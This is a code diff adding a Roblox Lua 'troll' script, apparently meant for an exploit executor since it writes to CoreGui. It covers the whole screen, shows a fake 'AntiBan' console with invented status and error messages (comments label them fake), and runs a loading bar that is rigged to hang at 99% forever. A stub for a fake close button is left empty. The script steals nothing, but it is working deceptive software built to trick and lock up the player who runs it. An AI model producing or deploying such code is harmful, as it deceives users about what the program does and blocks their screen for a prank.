@@ -1,0 +1,341 @@
+-- SERVICES
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+local SoundService = game:GetService("SoundService")
+local CoreGui = game:GetService("CoreGui")
+
+-- GUI SETUP (Topmost screen)
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "TrollLoadingScreen"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.DisplayOrder = 99999
+screenGui.Parent = CoreGui
+
+-- Disable Roblox controls
+UserInputService.ModalEnabled = true
+
+-- BACKGROUND MUSIC
+local bgMusic = Instance.new("Sound", SoundService)
+bgMusic.SoundId = "rbxassetid://1837467334"
+bgMusic.Looped = true
+bgMusic.Volume = 0.3
+bgMusic:Play()
+
+-- MAIN BACKGROUND
+local mainFrame = Instance.new("Frame", screenGui)
+mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+mainFrame.Size = UDim2.new(1, 0, 1, 0)
+mainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
+mainFrame.ZIndex = 0
+
+-- GALAXY IMAGE
+local galaxyImage = Instance.new("ImageLabel", mainFrame)
+galaxyImage.Size = UDim2.new(1.5, 0, 1.5, 0)
+galaxyImage.Position = UDim2.new(-0.25, 0, -0.25, 0)
+galaxyImage.BackgroundTransparency = 1
+galaxyImage.ImageTransparency = 0.15
+galaxyImage.Image = "rbxassetid://2558063658"
+galaxyImage.ZIndex = 1
+
+TweenService:Create(galaxyImage, TweenInfo.new(120, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {
+    Rotation = 360
+}):Play()
+
+-- ALEX ROBLOX TITLE (NEW)
+local titleLabel = Instance.new("TextLabel", mainFrame)
+titleLabel.Size = UDim2.new(0.4, 0, 0.1, 0)
+titleLabel.Position = UDim2.new(0.3, 0, 0.02, 0)
+titleLabel.Text = "ALEX ROBLOX"
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Font = Enum.Font.GothamBlack
+titleLabel.TextSize = 36
+titleLabel.TextStrokeTransparency = 0.7
+titleLabel.TextStrokeColor3 = Color3.fromRGB(0, 150, 255)
+titleLabel.ZIndex = 5
+
+-- Add a subtle glow effect
+local titleGlow = Instance.new("UIGradient", titleLabel)
+titleGlow.Rotation = 90
+titleGlow.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(100, 200, 255))
+})
+
+-- LOADING TEXT
+local loadingBox = Instance.new("Frame", mainFrame)
+loadingBox.Size = UDim2.new(0.5, 0, 0.15, 0)
+loadingBox.Position = UDim2.new(0.25, 0, 0.15, 0)
+loadingBox.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+loadingBox.BackgroundTransparency = 0.3
+loadingBox.ZIndex = 3
+Instance.new("UICorner", loadingBox).CornerRadius = UDim.new(0, 12)
+
+local loadingText = Instance.new("TextLabel", loadingBox)
+loadingText.Size = UDim2.new(1, -40, 1, -20)
+loadingText.Position = UDim2.new(0, 20, 0, 10)
+loadingText.Text = "Initializing System"
+loadingText.TextColor3 = Color3.new(1, 1, 1)
+loadingText.BackgroundTransparency = 1
+loadingText.Font = Enum.Font.GothamBold
+loadingText.TextSize = 28
+loadingText.TextXAlignment = Enum.TextXAlignment.Left
+loadingText.ZIndex = 4
+
+-- FAKE PROTECTION CONSOLE (IMPROVED)
+local consoleBox = Instance.new("Frame", mainFrame)
+consoleBox.Size = UDim2.new(0.5, 0, 0.35, 0)
+consoleBox.Position = UDim2.new(0.25, 0, 0.32, 0)
+consoleBox.BackgroundColor3 = Color3.fromRGB(10, 10, 20)
+consoleBox.BackgroundTransparency = 0.2
+consoleBox.ZIndex = 3
+Instance.new("UICorner", consoleBox).CornerRadius = UDim.new(0, 12)
+
+-- Console border effect
+local consoleBorder = Instance.new("UIStroke", consoleBox)
+consoleBorder.Color = Color3.fromRGB(50, 100, 150)
+consoleBorder.Thickness = 2
+consoleBorder.Transparency = 0.5
+
+-- ScrollingFrame for console messages
+local consoleScroll = Instance.new("ScrollingFrame", consoleBox)
+consoleScroll.Size = UDim2.new(1, -20, 1, -20)
+consoleScroll.Position = UDim2.new(0, 10, 0, 10)
+consoleScroll.BackgroundTransparency = 1
+consoleScroll.ScrollBarThickness = 6
+consoleScroll.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
+consoleScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+consoleScroll.ScrollingDirection = Enum.ScrollingDirection.Y
+consoleScroll.ZIndex = 4
+
+-- Container for console messages
+local consoleTextContainer = Instance.new("Frame", consoleScroll)
+consoleTextContainer.Size = UDim2.new(1, 0, 0, 0)
+consoleTextContainer.BackgroundTransparency = 1
+consoleTextContainer.AutomaticSize = Enum.AutomaticSize.Y
+
+local uiListLayout = Instance.new("UIListLayout", consoleTextContainer)
+uiListLayout.Padding = UDim.new(0, 5)
+uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+-- Function to add colored console text
+local function addConsoleText(text, color)
+    color = color or Color3.fromRGB(50, 255, 50) -- Default green
+    
+    local textLabel = Instance.new("TextLabel", consoleTextContainer)
+    textLabel.Size = UDim2.new(1, 0, 0, 0)
+    textLabel.AutomaticSize = Enum.AutomaticSize.Y
+    textLabel.BackgroundTransparency = 1
+    textLabel.TextColor3 = color
+    textLabel.Font = Enum.Font.Code
+    textLabel.TextSize = 18
+    textLabel.TextXAlignment = Enum.TextXAlignment.Left
+    textLabel.TextWrapped = true
+    textLabel.Text = text
+    textLabel.LayoutOrder = #consoleTextContainer:GetChildren()
+    textLabel.ZIndex = 5
+
+    -- Auto-scroll to bottom
+    task.spawn(function()
+        task.wait(0.05)
+        consoleScroll.CanvasPosition = Vector2.new(0, consoleTextContainer.AbsoluteSize.Y)
+    end)
+end
+
+-- Function for typing animation
+local function typeConsoleText(text, color, speed)
+    speed = speed or 0.03
+    color = color or Color3.fromRGB(50, 255, 50)
+    
+    local textLabel = Instance.new("TextLabel", consoleTextContainer)
+    textLabel.Size = UDim2.new(1, 0, 0, 0)
+    textLabel.AutomaticSize = Enum.AutomaticSize.Y
+    textLabel.BackgroundTransparency = 1
+    textLabel.TextColor3 = color
+    textLabel.Font = Enum.Font.Code
+    textLabel.TextSize = 18
+    textLabel.TextXAlignment = Enum.TextXAlignment.Left
+    textLabel.TextWrapped = true
+    textLabel.Text = ""
+    textLabel.LayoutOrder = #consoleTextContainer:GetChildren()
+    textLabel.ZIndex = 5
+
+    -- Typing animation
+    task.spawn(function()
+        for i = 1, #text do
+            textLabel.Text = textLabel.Text .. text:sub(i, i)
+            task.wait(speed + math.random() * 0.02)
+        end
+        
+        -- Auto-scroll to bottom
+        task.wait(0.05)
+        consoleScroll.CanvasPosition = Vector2.new(0, consoleTextContainer.AbsoluteSize.Y)
+    end)
+end
+
+-- Console animation
+task.spawn(function()
+    -- Initial delay
+    task.wait(1.5)
+    
+    -- Improved console messages with colors
+    local consoleMessages = {
+        {"> Loading AntiBan system...", Color3.fromRGB(50, 255, 50)},
+        {"> Initializing protection modules...", Color3.fromRGB(50, 200, 255)},
+        {"> Scanning for exploits...", Color3.fromRGB(255, 150, 50)},
+        {"> Establishing secure connection...", Color3.fromRGB(100, 255, 100)},
+        {"> Bypassing detection systems...", Color3.fromRGB(255, 100, 100)},
+        {"> Injecting protection scripts...", Color3.fromRGB(180, 100, 255)},
+        {"> Encrypting user data...", Color3.fromRGB(100, 200, 255)},
+        {"> Hooking game functions...", Color3.fromRGB(255, 255, 100)},
+        {"> Setting up fake metrics...", Color3.fromRGB(200, 100, 255)},
+        {"> Creating secure environment...", Color3.fromRGB(100, 255, 200)},
+        {"> Protection system active!", Color3.fromRGB(50, 255, 50)}
+    }
+
+    for _, msg in ipairs(consoleMessages) do
+        local delay = 0.5 + math.random() * 1.5
+        
+        -- Sometimes add a fake error
+        if math.random() < 0.2 then
+            typeConsoleText("> [ERROR] " .. msg[1]:sub(3) .. " failed", Color3.fromRGB(255, 50, 50))
+            task.wait(0.3)
+            typeConsoleText("> Retrying...", Color3.fromRGB(255, 150, 50))
+            task.wait(0.5)
+            typeConsoleText("> " .. msg[1]:sub(3) .. " successful", Color3.fromRGB(50, 255, 50))
+        else
+            typeConsoleText(msg[1], msg[2])
+        end
+        
+        task.wait(delay)
+    end
+    
+    -- Keep adding random status updates
+    local statusUpdates = {
+        {"> Protection active - " .. math.random(100) .. "%", Color3.fromRGB(50, 255, 50)},
+        {"> Monitoring game state...", Color3.fromRGB(100, 200, 255)},
+        {"> No threats detected", Color3.fromRGB(100, 255, 100)},
+        {"> System nominal", Color3.fromRGB(180, 255, 100)},
+        {"> Memory usage: " .. math.random(30,70) .. "MB", Color3.fromRGB(255, 200, 100)},
+        {"> Ping: " .. math.random(20,150) .. "ms", Color3.fromRGB(100, 255, 255)}
+    }
+    
+    while true do
+        local randomUpdate = statusUpdates[math.random(#statusUpdates)]
+        if math.random() < 0.7 then  -- 70% chance to add timestamp
+            local hours = math.random(0,23)
+            local mins = math.random(0,59)
+            randomUpdate[1] = string.format("[%02d:%02d] ", hours, mins) .. randomUpdate[1]:sub(3)
+        end
+        addConsoleText(randomUpdate[1], randomUpdate[2])
+        task.wait(3 + math.random() * 5)
+    end
+end)
+
+-- LOADING BAR (MOVED DOWN SLIGHTLY)
+local barContainer = Instance.new("Frame", mainFrame)
+barContainer.Size = UDim2.new(0.6, 0, 0.03, 0)
+barContainer.Position = UDim2.new(0.2, 0, 0.72, 0)
+barContainer.BackgroundColor3 = Color3.fromRGB(30, 35, 50)
+barContainer.ZIndex = 3
+Instance.new("UICorner", barContainer).CornerRadius = UDim.new(1, 0)
+
+local barFill = Instance.new("Frame", barContainer)
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
+barFill.ZIndex = 4
+Instance.new("UICorner", barFill).CornerRadius = UDim.new(1, 0)
+
+local percentText = Instance.new("TextLabel", barContainer)
+percentText.Size = UDim2.new(1, 0, 3, 0)
+percentText.Position = UDim2.new(0, 0, 1, 10)
+percentText.BackgroundTransparency = 1
+percentText.TextColor3 = Color3.new(1, 1, 1)
+percentText.Font = Enum.Font.GothamBold
+percentText.TextSize = 24
+percentText.ZIndex = 5
+
+-- REALISTIC 10-MINUTE LOADING SIMULATION
+local totalTime = 600 -- 10 minutes in seconds
+local startTime = os.time()
+
+-- Loading phases with different speeds (percentage, speed multiplier)
+local phases = {
+    {10, 3.0},  -- Fast initial load (0-10%)
+    {30, 1.5},  -- Medium speed (10-30%)
+    {60, 0.8},  -- Slowing down (30-60%)
+    {85, 0.4},  -- Very slow (60-85%)
+    {99, 0.2}   -- Extremely slow (85-99%)
+}
+
+local currentPhase = 1
+local completedTasks = 0
+local totalTasks = 100 -- For progress simulation
+
+-- System messages that appear at certain percentages
+local systemMessages = {
+    {5, "Booting system core..."},
+    {15, "Loading security modules..."},
+    {30, "Initializing data streams..."},
+    {50, "Verifying system integrity..."},
+    {70, "Optimizing performance..."},
+    {85, "Finalizing setup..."},
+    {95, "Almost there..."}
+}
+
+task.spawn(function()
+    while true do
+        local elapsed = os.time() - startTime
+        local progressPercent = math.min(99, (elapsed / totalTime) * 100)
+        
+        -- Update current phase
+        if currentPhase < #phases and progressPercent >= phases[currentPhase+1][1] then
+            currentPhase = currentPhase + 1
+        end
+        
+        -- Update progress bar and text
+        barFill.Size = UDim2.new(progressPercent/100, 0, 1, 0)
+        percentText.Text = string.format("%.1f%%", progressPercent)
+        
+        -- Update loading text with system messages
+        for _, msg in ipairs(systemMessages) do
+            if progressPercent >= msg[1] and (progressPercent - msg[1] < 0.5) then
+                loadingText.Text = msg[2]
+            end
+        end
+        
+        -- Simulate variable speed based on current phase
+        local speedMultiplier = phases[currentPhase][2]
+        local waitTime = 0.1 / speedMultiplier
+        
+        -- Random speed fluctuations to make it more realistic
+        waitTime = waitTime * (0.8 + math.random() * 0.4)
+        
+        task.wait(waitTime)
+        
+        -- Stop at 99%
+        if progressPercent >= 99 then
+            while true do
+                -- Oscillate between 99.0 and 99.5 to make it look stuck
+                for i = 0, 5 do
+                    percentText.Text = string.format("99.%d%%", i)
+                    task.wait(2)
+                end
+                for i = 5, 0, -1 do
+                    percentText.Text = string.format("99.%d%%", i)
+                    task.wait(2)
+                end
+            end
+        end
+    end
+end)
+
+-- FAKE CLOSE BUTTON
+
+
+-- Cleanup when player leaves
+game:GetService("Players").PlayerRemoving:Connect(function()
+    screenGui:Destroy()
+end)
